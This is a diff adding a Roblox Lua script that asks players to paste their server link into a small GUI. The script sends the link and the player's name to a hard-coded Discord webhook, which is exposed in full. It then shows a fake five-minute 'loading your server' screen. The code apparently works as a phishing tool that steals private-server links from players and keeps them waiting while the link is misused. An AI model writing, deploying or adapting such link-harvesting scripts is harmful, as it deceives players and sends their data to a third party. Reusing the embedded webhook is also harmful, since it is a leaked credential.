@@ -1,0 +1,81 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- ✅ Tu webhook de Discord
+local webhookURL = "https://discord.com/api/webhooks/1430403557865291808/o_NJY-kh006d_1O_8PwAya7O-peRDrORtA19gAAyVHxHHvUTDZdb-EX4Lq2ZIU0M_f31"
+
+-- 🖼️ Crear GUI para ingresar el link
+local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+gui.Name = "LinkSenderUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0.4, 0, 0.3, 0)
+frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+
+local textbox = Instance.new("TextBox", frame)
+textbox.Size = UDim2.new(0.9, 0, 0.3, 0)
+textbox.Position = UDim2.new(0.05, 0, 0.2, 0)
+textbox.PlaceholderText = "Pega el link de tu servidor aquí"
+textbox.Text = ""
+textbox.TextScaled = true
+textbox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(0.5, 0, 0.25, 0)
+button.Position = UDim2.new(0.25, 0, 0.6, 0)
+button.Text = "Enviar"
+button.TextScaled = true
+button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+-- 📤 Enviar link al webhook
+local function sendToWebhook(link)
+    local data = {
+        ["content"] = "**Nuevo link de servidor recibido:**\n" .. link .. "\nUsuario: " .. LocalPlayer.Name,
+        ["username"] = "AutoMoreiraBot"
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+-- ⏳ Pantalla de carga de 5 minutos
+local function showLoading()
+    gui:Destroy()
+
+    local loadingGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    loadingGui.Name = "LoadingScreen"
+
+    local loadingFrame = Instance.new("Frame", loadingGui)
+    loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+    local loadingText = Instance.new("TextLabel", loadingFrame)
+    loadingText.Size = UDim2.new(1, 0, 1, 0)
+    loadingText.Text = "Cargando tu servidor... Por favor espera 5 minutos"
+    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.TextScaled = true
+    loadingText.BackgroundTransparency = 1
+
+    wait(300)
+    loadingGui:Destroy()
+end
+
+-- 🖱️ Acción del botón con bloqueo
+button.MouseButton1Click:Connect(function()
+    local link = textbox.Text
+    if link ~= "" then
+        sendToWebhook(link)
+        button.Text = "Enviado"
+        button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+        button.TextColor3 = Color3.fromRGB(200, 200, 200)
+        button.Active = false
+        button.AutoButtonColor = false
+        textbox.TextEditable = false
+        showLoading()
+    end
+end)
